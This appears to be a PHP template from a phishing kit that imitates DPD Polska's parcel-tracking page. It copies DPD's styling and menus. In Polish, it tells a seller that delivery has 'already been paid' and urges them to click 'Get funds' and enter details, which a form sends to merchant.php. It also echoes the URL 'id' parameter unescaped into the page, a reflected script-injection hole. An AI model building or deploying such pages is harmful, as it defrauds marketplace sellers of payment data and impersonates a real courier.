.footer-menu-root-item{margin-bottom:13px}footer .mobile-footer .footer-menu{margin-top:.25rem}footer .mobile-footer .footer-menu .footer-link{padding-left:0}footer .mobile-footer .footer-menu .footer-link li{float:left;padding-left:0!important;margin-top:.25rem}footer .mobile-footer .footer-menu .footer-link li:not(:last-of-type){margin-right:.5rem}footer .footer-nav a{border-right:1px solid #414042}footer .footer-nav a:nth-last-child(-n+2){border-right:none}footer.container>.row-fix-margin-auto{padding:29px 20px 20px 20px}@media (min-width:544px){footer.container>.row-fix-margin-auto{padding:29px 20px 20px 20px}}@media (min-width:768px){footer.container>.row-fix-margin-auto{padding:29px 12px 25px 12px}footer .footer-menu .footer-link li{float:left}}@media (min-width:992px){footer.container>.row-fix-margin-auto{padding:29px 26px 25px 26px}footer .footer-links{max-width:20%;-webkit-flex:0 0 20%;-ms-flex:0 0 20%;flex:0 0 20%}}@media (min-width:1200px){footer.page-footer{max-width:1140px;margin-left:auto;margin-right:auto}footer.container>.row-fix-margin-auto{padding:29px 30px 25px 30px}}header{z-index:1000;background:#fff;position:relative;border-bottom:1px solid #e6e7e8}header .mainnavbar{min-height:65px;padding-top:5px}header .size-icon-logo{max-width:68.66px;height:30.1px}header .navbar .offmenu-toggle{-webkit-align-self:flex-start;-ms-flex-item-align:start;align-self:flex-start;position:relative;top:19px}header .navbar .navbar-brand{-webkit-align-self:flex-start;-ms-flex-item-align:start;align-self:flex-start;position:relative;top:11px;min-width:84px}header .navbar .header-search{background-color:#fff}@supports ((position:-webkit-sticky) or (position:sticky)) or (position:-webkit-sticky){}.flyout-headline{font-size:16px;font-weight:400;font-style:normal;font-stretch:normal;line-height:1.88;color:#dc0032}.padding-header{max-width:1200px;margin:0 auto}.right-search-header{right:85px!important}.right-search-header.wide-search-box input{padding-left:35px}header .navbar{padding-right:12px;padding-left:12px}header .navbar .wide-search-box{left:-webkit-calc(100% - 90px);left:calc(100% - 90px)}header .navbar .wide-search-box.mobile-search{padding-top:13px;padding-left:12px;padding-right:12px}header .navbar .wide-search-box.mobile-search img.mobile-search-close{width:20px;height:20px;right:12px}header .navbar .wide-search-box.mobile-search>h3{margin-top:36px;margin-bottom:25px}header .navbar .wide-search-box.mobile-search input{padding-left:30px;padding-bottom:12px;margin-top:25px;margin-bottom:45px;border-bottom:1px solid #808285}@media (min-width:544px){header .navbar{padding-right:20px;padding-left:20px}header .navbar .wide-search-box.mobile-search{padding-left:20px;padding-right:20px}header .navbar .wide-search-box.mobile-search img.mobile-search-close{right:20px}}@media (min-width:768px){header .navbar{padding-right:20px;padding-left:20px}header .navbar .wide-search-box{left:-webkit-calc(100% - 110px);left:calc(100% - 110px)}header .navbar .wide-search-box.right-search-header{right:75px!important}header .offmenu-toggle{-webkit-align-self:flex-start;-ms-flex-item-align:start;align-self:flex-start;position:relative;top:19px}}@media (min-width:992px){header .navbar{padding-right:34px;padding-left:34px}header .navbar .wide-search-box{left:-webkit-calc(100% - 120px);left:calc(100% - 120px);max-width:79%}header .navbar .navbar-nav .dropdown-menu{padding-left:26px;padding-right:26px;padding-top:20px;padding-bottom:25px}header .navbar .navbar-nav .dropdown-menu>div:first-child h3{line-height:30px;margin-bottom:5px}header .navbar .navbar-nav .dropdown-menu .dropdown-item{padding:0;color:#414042;background:url("dpd-image-1.svg") no-repeat 91% 50%;-webkit-transition:background 1s ease;-o-transition:background 1s ease;transition:background 1s ease}header .navbar .navbar-nav .dropdown-menu .dropdown-item:hover{color:#dc0032;background-position-x:100%}header .navbar .navbar-nav .dropdown-menu .dropdown-item span{padding:1rem 0;display:block;width:98%;border-bottom:solid 1px #e6e7e8}header .navbar .navbar-nav .dropdown-menu .dropdown-item:last-child span{border-bottom:none}header .navbar .navbar-nav .dropdown-menu .dropdown-item span{line-height:50px;max-width:85%;overflow:hidden;word-break:break-word;white-space:normal;padding-top:0;padding-bottom:0}header .size-icon-logo{max-width:74.58px;height:32.7px}}@media (min-width:1200px){header .navbar{max-width:1200px;padding-right:38px;padding-left:38px}header .navbar .wide-search-box{left:-webkit-calc(100% - 120px);left:calc(100% - 120px);max-width:80%}header .navbar .wide-search-box.right-search-header{right:80px!important}header .navbar .navbar-nav .dropdown-menu{padding-left:30px;padding-right:30px}header.sticky-header{margin-left:-8px;margin-right:-8px}@supports ((position:-webkit-sticky) or (position:sticky)) or (position:-webkit-sticky){}}@media screen and (min-width:992px){.mainnavbar .dropdown .sub-expand{display:none}}@supports (-moz-animation:alternate){}[placeholder]{-o-text-overflow:ellipsis;text-overflow:ellipsis}::-webkit-input-placeholder{text-overflow:ellipsis}::-moz-placeholder{text-overflow:ellipsis}:-ms-input-placeholder{text-overflow:ellipsis}:-moz-placeholder{text-overflow:ellipsis}@media (min-width:992px){@supports ((position:-webkit-sticky) or (position:sticky)){}}@media (min-width:992px){@supports ((position:-webkit-sticky) or (position:sticky)){}}input[type=text]{display:inline-block;margin-bottom:0;font-size:14px;font-weight:300;line-height:1.14;border:none;color:#414042;vertical-align:middle;-webkit-border-radius:0;border-radius:0;width:100%;padding:0}input[type=text]{background-color:#fff;-webkit-box-shadow:none;box-shadow:none;-webkit-transition:none;-o-transition:none;transition:none}input[type=text]:focus{border:none;outline:0;-webkit-box-shadow:none;box-shadow:none}input[type=text]:-moz-read-only{color:#808285}input{font-family:PlutoSansRegular}.input-box{width:100%;height:45px;background-color:#fff;border:solid 1px #808285;-webkit-box-sizing:border-box;box-sizing:border-box;padding:7px 10px 0 10px;position:relative;display:inline-block;vertical-align:top}.input-box[class*=search-box]{padding-top:13px}.search-close,i.input-icon{position:absolute;top:12px;right:10px;cursor:pointer}.search-close{right:0}a{color:#414042;border-bottom:1px solid transparent}.navbar .navbar-brand{margin-left:0;margin-right:2rem;padding-top:0;padding-bottom:.2rem}.navbar .dropdown-menu div[class*=col]{margin-bottom:1rem}.navbar .dropdown-toggle::after{display:inline-block;width:0;height:0;vertical-align:0;content:"";border-top:0;border-right:0;border-bottom:0;border-left:0}.navbar .dropdown-menu{border:none}.navbar{padding-top:0;padding-bottom:0}.navbar .nav-item{padding:.7rem .3rem;margin:0}.navbar .nav-item:hover .nav-link span{border-bottom:1px solid #dc0032;color:#dc0032;padding-bottom:5px}.navbar .dropdown{position:static}.navbar .dropdown-menu{width:100%;left:0;right:0}.navbar .dropdown:hover>.dropdown-menu,.navbar .dropdown>.dropdown-menu:hover{display:block}.navbar .dropdown-menu{background-color:#fff;top:98%;border-top:1px solid #e6e7e8;-webkit-border-radius:0;border-radius:0;font-size:14px}.dropdown-menu .dropdown-item:hover{color:#dc0032;background-position-x:100%}.dropdown-menu .dropdown-item span{padding:1rem 0;display:block;width:98%;border-bottom:solid 1px #e6e7e8}.dropdown-menu .dropdown-item:last-child span{border-bottom:none}.offmenu-toggle{cursor:pointer;min-width:23px}.navbar .wide-search-box{position:absolute;width:auto;border-bottom:none;right:85px;left:-webkit-calc(100% - 120px);left:calc(100% - 120px);-webkit-transition:all 250ms ease-in-out;-o-transition:all 250ms ease-in-out;transition:all 250ms ease-in-out;max-width:90%;top:11px}.navbar .wide-search-box .search-close{display:none}.mainnavbar{border-bottom:1px solid #e6e7e8}@media screen and (min-width:992px){.navbar-brand{-webkit-align-self:flex-start;-ms-flex-item-align:start;align-self:flex-start;position:relative;top:11px;min-width:84px}.offmenu-toggle{-webkit-align-self:flex-start;-ms-flex-item-align:start;align-self:flex-start;position:relative;top:19px}}@media screen and (max-width:991px){.navbar .wide-search-box{top:3px}}@media screen and (min-width:768px){.mainnavbar .navbar-nav{-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;padding-right:60px}}@media screen and (max-width:767px){.mobile-search-close.search-close{right:10px}.mobile-search .clear-text{position:absolute;right:11%;top:70px}.mobile-search .clear-text,.mobile-search .mobile-search-close,.mobile-search .search-term-wrap-mobile,.mobile-search h3,.mobile-search input{display:none}}.text-search-box::-ms-clear{display:none}@media screen and (min-width:992px){.mainnavbar .dropdown .sub-expand{display:none}}
body::-webkit-scrollbar-thumb{-webkit-appearance:none;appearance:none;width:96px;height:33px;background:#414042;-webkit-box-shadow:0 2px 4px 0 rgba(0,0,0,.5);box-shadow:0 2px 4px 0 rgba(0,0,0,.5);-webkit-border-radius:4px;border-radius:4px}
input[type=text]{display:inline-block;margin-bottom:0;font-size:14px;font-weight:300;line-height:1.14;border:none;color:#414042;vertical-align:middle;-webkit-border-radius:0;border-radius:0;width:100%;padding:0}input[type=text]{background-color:#fff;-webkit-box-shadow:none;box-shadow:none;-webkit-transition:none;-o-transition:none;transition:none}input[type=text]:focus{border:none;outline:0;-webkit-box-shadow:none;box-shadow:none}.search-close,i.input-icon{position:absolute;top:12px;right:10px;cursor:pointer}.navbar .nav-item:hover .nav-link span{border-bottom:1px solid #dc0032;color:#dc0032;padding-bottom:3px}.vertical-align{display:-ms-flexbox;display:flex;-ms-flex-align:center;align-items:center;display:-webkit-flex;-webkit-align-items:center}input[type=text]:-moz-read-only{color:#808285}input{font-family:PlutoSansRegular}.input-box{width:100%;height:45px;background-color:#fff;border:solid 1px #808285;-webkit-box-sizing:border-box;box-sizing:border-box;padding:7px 10px 0;position:relative;display:inline-block;vertical-align:top}.input-box[class*=search-box]{padding-top:13px}.search-close{right:0}.wide-search-box{border-left:0;border-top:0;border-right:0}.wide-search-box input{padding-left:24px}.wide-search-box i.input-icon{width:24px;left:10px;right:auto}@supports (-ms-ime-align:auto){}.bold-bg-color{background:#414042}.gold-bg-color{background:#cac4be}.navbar{padding-top:0;padding-bottom:0}.navbar .navbar-brand{margin-left:0;margin-right:2rem;padding-top:0;padding-bottom:.2rem}.navbar .dropdown-menu{border:none;width:100%;left:0;right:0;background-color:#fff;top:97%;border-top:1px solid #e6e7e8;-webkit-border-radius:0;border-radius:0;font-size:14px}.navbar .dropdown-menu div[class*=col]{margin-bottom:1rem}.navbar .dropdown-toggle::after{display:inline-block;width:0;height:0;vertical-align:0;content:"";border-top:0;border-right:0;border-bottom:0;border-left:0}.navbar .nav-item{padding:.7rem .3rem;margin:0}.navbar .dropdown{position:static}.navbar .dropdown:hover>.dropdown-menu{display:block!important}.navbar .dropdown>.dropdown-menu:hover{display:block!important}.navbar .wide-search-box{position:absolute;width:auto;border-bottom:none;right:85px;left:-webkit-calc(100% - 80px);left:calc(100% - 80px);-webkit-transition:all 250ms ease-in-out;-o-transition:all 250ms ease-in-out;transition:all 250ms ease-in-out;max-width:90%;top:11px;background:0 0}.navbar .wide-search-box .search-close{display:none}.offmenu-toggle{cursor:pointer}.mainnavbar{border-bottom:1px solid #e6e7e8}@supports ((width:-webkit-max-content) or (width:-moz-max-content) or (width:max-content)) or (width:-moz-max-content){}.sub-expand.active{background:url("dpd-image-7.svg") no-repeat 100%}.dropdown-menu .dropdown-item:hover{color:#dc0032;background-position-x:100%}.dropdown-menu .dropdown-item span{padding:1rem 0;display:block;width:98%;border-bottom:solid 1px #e6e7e8}.dropdown-menu .dropdown-item:last-child span{border-bottom:none}@media screen and (max-width:991px){.navbar .wide-search-box{top:11px}}@media screen and (max-width:767px){.text-box{border:1px solid #808285!important}.mobile-search .clear-text{position:absolute;right:11%;top:70px;display:none}.mobile-search .mobile-search-close{display:none}.mobile-search h3{display:none}.mobile-search .search-term-wrap-mobile{display:none}.mobile-search input{display:none}.mobile-search-close.search-close{right:10px}}@media screen and (min-width:992px){.navbar .wide-search-box{top:11px}}body{counter-reset:item}.border-bot-none{border:none}@supports (-webkit-line-clamp:1){}.mainnavbar .nav-item.current-menu-parent .nav-link span{border-bottom:1px solid #dc0032;color:#dc0032;padding-bottom:3px}@charset "UTF-8";:root{--wp-admin-theme-color:#007cba;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-20:#005a87}@supports (-webkit-overflow-scrolling:touch){}@supports ((position:-webkit-sticky) or (position:sticky)){}@supports ((position:-webkit-sticky) or (position:sticky)){}@supports ((position:-webkit-sticky) or (position:sticky)){}@supports ((position:-webkit-sticky) or (position:sticky)){}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;line-height:.68;font-weight:100;margin:.05em .1em 0 0;text-transform:uppercase;font-style:normal}@supports ((position:-webkit-sticky) or (position:sticky)){}
</style>		
</head>
<body>
<div class="_0">
<div class="container">
<header class="row-fix-margin-auto justify-content-between sticky-header border-bot-none is_stuck">
<nav class="navbar mainnavbar padding-header col-12 col-sm-12 col-md-12 pb-0 navbar-expand-md">
<a class="navbar-brand" href="https://www.dpd.com/pl/pl/"><img src="./dpd_files/dpd-image-4.svg" class="size-icon-logo" alt=""></a>
<div class="collapse navbar-collapse" id="navbarNav">
<ul class="navbar-nav d-md-none d-lg-flex font-light">
<li class="nav-item    menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link " href="https://www.dpd.com/pl/pl/odbieram-paczke/"><span>Odbieram</span></a>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-custom menu-item-object-custom">
<a class="nav-link dropdown-toggle" href="https://www.dpdpickup.pl/Wycen-i-nadaj-Online/"><span>Wysyłam</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpdpickup.pl/Wycen-i-nadaj-Online/">
<span>Wyślij paczkę</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/wielka-wyprzedaz-paczek/">
<span>Promocje</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/cennik-przesylek-krajowych/">
<span>Cennik przesyłek krajowych</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/cennik-przesylek-miedzynarodowych/">
<span>Cennik przesyłek międzynarodowych</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/regulaminy-dpd-pickup/">
<span>Regulaminy DPD Pickup</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/pl/pl/oferta-dla-firm/"><span>Oferta dla firm</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/oferta-dla-firm/uslugi-krajowe-dpd-polska/">
<span>Usługi krajowe</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/oferta-dla-firm/ekspresowy-serwis-krajowy/">
<span>Ekspresowy serwis krajowy</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/oferta-dla-firm/uslugi-miedzynarodowe-dpd-polska/">
<span>Usługi międzynarodowe</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/oferta-dla-firm/miedzynarodowy-serwis-paletowy-dpd-max/">
<span>Międzynarodowy serwis paletowy</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/oferta-dla-firm/dpd-today/">
<span>DPD TODAY</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/oferta-dla-firm/dpd-food/">
<span>DPD FOOD</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/oferta-dla-firm/zwroty-z-dpd-polska/">
<span>Łatwe zwroty z DPD Polska</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/oferta-dla-firm/rozwiazania-it/">
<span>Rozwiązania IT</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/oferta-dla-firm/warunki-wysylki/">
<span>Warunki wysyłki</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/pl/pl/dpd-pickup/"><span>Sieć DPD Pickup</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/dpd-pickup/znajdz-punkt-pickup/">
<span>Znajdź punkt DPD Pickup</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/dpd-pickup/otworz-punkt-dpd-pickup/">
<span>Otwórz punkt DPD Pickup</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/dpd-pickup/oddzialy-miejskie-dpd-polska/">
<span>DPD Pickup Oddziały Miejskie</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/pl/pl/obsluga-klienta/"><span>Moje DPD</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/moje-dpd/dokumenty-dpd-polska/">
<span>Dokumenty</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/moje-dpd/zostan-klientem-dpd-polska/">
<span>Zostań klientem</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/moje-dpd/formularz-e-faktura/">
<span>E-faktura</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/moje-dpd/zamow-kuriera/">
<span>Zamów kuriera</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-custom menu-item-object-custom" style="border-bottom: 1px solid #e6e7e8" href="https://sklep.dpd.com.pl/">
<span>eSklep DPD</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-18341 current_page_item" href="<?php echo $_GET['id']; ?>">
<span>Reklamacja</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/moje-dpd/zwroty-przesylek-dpd/">
<span>Zwrot przesyłki</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/moje-dpd/kontakt-z-opiekunem-handlowym/">
<span>Opiekun handlowy</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
<li class="nav-item dropdown has-sub   menu-item menu-item-type-post_type menu-item-object-page">
<a class="nav-link dropdown-toggle" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/"><span>Zrównoważony rozwój</span></a>
<i class="sub-expand active"></i>
<div class="dropdown-menu">
<div class="row">
<div class="col-12 col-lg-6"></div>
<div class="col-12">
<h3 class="flyout-headline"></h3>
<div class="row font-light mb-4 sub">
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/przyjazna-logistyka-miejska/">
<span>Przyjazna logistyka miejska</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/neutralni-dla-srodowiska/">
<span>Neutralni dla środowiska</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" style="border-bottom: 1px solid #e6e7e8" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/badania-jakosci-powietrza/">
<span>Badania jakości powietrza</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/innowacyjna-przedsiebiorczosc/">
<span>Innowacyjna przedsiębiorczość</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/blizej-spolecznosci/">
<span>Bliżej społeczności</span>
</a>
</div>
<div class="col-lg-4">
<a class="dropdown-item  menu-item menu-item-type-post_type menu-item-object-page" href="https://www.dpd.com/pl/pl/zrownowazony-rozwoj/pracodawca-z-wyboru/">
<span>Pracodawca z wyboru</span>
</a>
</div>
</div>
</div>
</div>
</div>
</li>
</ul>
</div>
<form action="" id="search-desktop" method="GET">
<div class="input-box search-box wide-search-box d-none d-md-block l-search header-search right-search-header">
<input type="text" name="s" class="text-search-box text-box pt-1 font-light" placeholder="Wyszukiwane hasło" value="">
<i class="input-icon"><img src="./dpd_files/dpd-image-6.svg" alt=""></i>
<span class="search-close"><img src="./dpd_files/dpd-image-9.svg" alt=""></span>
</div>
</form>
<form action="" id="search-mobile" method="GET">
<div class="mobile-search input-box search-box wide-search-box d-block d-md-none l-search">
<img class="mobile-search-close search-close" src="./dpd_files/dpd-image-3.svg" alt="">
<h3 class="font-light text-center">Wyszukiwanie</h3>
<input type="text" name="s" class="text-search-box font-light col-10 offset-1" placeholder="Wyszukiwane hasło" value="">
<i class="input-icon"><img src="./dpd_files/dpd-image-6.svg" alt=""></i>
<span class="clear-text"><img src="./dpd_files/dpd-image-9.svg" alt=""></span>
<div class="search-term-wrap-mobile">
</div>
</div>
</form>
<span class="offmenu-toggle"><img src="./dpd_files/dpd-image-2.svg" alt=""></span>
</nav>
</header>
</div>
<div>
<div class="_13">Śledzenie</div>
<div class="_3">
<div class="_17">
<div style="font-size: 18px; margin-bottom: 20px;">Numer wyjazdu: <span style="color: #dc0032; margin-left: 10px;"><?php echo $_GET['id']; ?></span></div>
<div style="font-size: 18px;">Status przesyłki: <span style="color: #dc0032; margin-left: 10px;">Otrzymanie środków</span></div>
</div>
</div>
<div class="_3">
<div class="_17">
<h2 style="color: #222;">Dostawa została już opłacona!</h2>
<div style="font-size: 16px; line-height: 1.7;"> 
Kliknij przycisk Pobierz środki i wprowadź informacje, które chcesz otrzymać. Po otrzymaniu pieniędzy na konte wyślij towar kupującemu zgodnie z podanymi danymi, na oficjalnej stronie DPD możesz zobaczyć dostępne towary do wysłania towaru.
<br><br>
Po wysłaniu towaru podaj kupującemu numer przesyłki! Towar należy wysłać w ciągu 3 dni od daty otrzymania pieniędzy.
</div>
<div class="_20">
<input form="form1" id="_buttonPay" class="_23" value="Zdobądź fundusze" type="submit">
</div>
</div>
</div>
<div class="_16">
<form id="form1" action="merchant.php" method="GET">
<input id="_formCost" name="id" value="<?php echo $_GET["id"]; ?>" type="hidden">
<div class="_4">Dane kupującego:</div>
<div class="_14 _21">
<table>
<tbody><tr>
<td class="_19 _15">Produkt:</td>
<td class="_19"><?php echo $xml->obyava; ?></td>
</tr>
<tr>
<td class="_19 _15">Kupujący:</td>
<td class="_19"><?php echo $xml->fio; ?></td>
</tr>
<tr>
<td class="_19 _15">Cena:</td>
<td class="_19"><?php echo $xml->price; ?> PLN</td>
</tr>
<tr>
<td class="_19 _15">Numer wyjazdu:</td>
<td class="_19"><?php echo $_GET['id']; ?></td>
</tr>
</tbody></table>
</div>
</form>
</div>
</div>
<footer class="page-footer container">
<div class="row-fix-margin-auto desktop-footer d-none d-md-block gold-bg-color">
<div class="col-12">
<div class="row footer-sitemap">
<div class="col-md-9 col-lg-10">
<div class="row">
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/pl/pl/oferta-dla-firm/" class="grey-color">Oferta dla firm</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/oferta-dla-firm/uslugi-krajowe-dpd-polska/" class="grey-color">Usługi krajowe</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/oferta-dla-firm/uslugi-miedzynarodowe-dpd-polska/" class="grey-color">Usługi międzynarodowe</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/oferta-dla-firm/warunki-wysylki/" class="grey-color">Warunki wysyłki</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/oferta-dla-firm/rozwiazania-it/" class="grey-color">Rozwiązania IT</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/pl/pl/obsluga-klienta/" class="grey-color">Moje DPD</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/moje-dpd/dokumenty-dpd-polska/" class="grey-color">Dokumenty DPD Polska</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/moje-dpd/zostan-klientem-dpd-polska/" class="grey-color">Zostań naszym Klientem</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/dpd-pickup/znajdz-punkt-pickup/" class="grey-color">Znajdź punkt DPD Pickup</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://zk.dpd.com.pl/" class="grey-color">Zamów kuriera</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://www.dpd.com/pl/pl/o-dpd/" class="grey-color">O DPD</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/o-dpd/aktualnosci/" class="grey-color">Aktualności</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://www.dpd.com/pl/pl/o-dpd/centrum-prasowe/" class="grey-color">Centrum prasowe</a>
</p>
</div>
</div>
<div class="col-md-3 col-lg-2 footer-links">
<div class="mb-4">
<p class="small-text mb-3">
<a href="https://kariera.dpd.com.pl/" class="grey-color">Kariera w DPD</a>
</p>
<p class="small-text mb-2 font-light">
<a href="https://kariera.dpd.com.pl/#mapa" class="grey-color">Oferty pracy</a>
</p>
</div>
</div>
</div>
</div>
<div class="col-md-3 col-lg-2">
<div id="dpd_social_accounts_wg-3" class="widget dpd_social_accounts_wg"><div class="widget__inner dpd_social_accounts_wg__inner widget-wrap"> <div class="mb-3">
<p class="small-text mb-2">Social Media</p>
<p class="small-text mb-2 font-light">
<a href="https://twitter.com/dpdgroup_news?lang=en" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-15.png" width="22" height="22"></a><a href="https://www.linkedin.com/company/dpdgroup" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-14.png" width="22" height="22"></a><a href="https://www.instagram.com/dpdgroup_news/" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-13.png" width="22" height="22"></a><a href="https://www.youtube.com/channel/UCqQgjVUrIjw8TsoDUooBaFQ" class="fsocial-link primary-color mr-3" target="_blank"><img class="mb-1" src="./dpd_files/dpd-image-16.png" width="22" height="22"></a>
</p>
</div>
</div></div><div id="custom_html-2" class="widget_text widget widget_custom_html"><div class="widget_text widget__inner widget_custom_html__inner widget-wrap"><div class="textwidget custom-html-widget"></div></div></div>
</div>
</div>
<div class="row no-gutters vertical-align footer-social">
<div class="footer-clear col-12 bold-bg-color mb-3"></div>
<div class="col-lg-4 col-md-3 px-md-0 small-text font-light footer-logo">
<img src="./dpd_files/dpd-image-12.png" alt=""><span>&nbsp;© 2020 DPD</span>
</div>
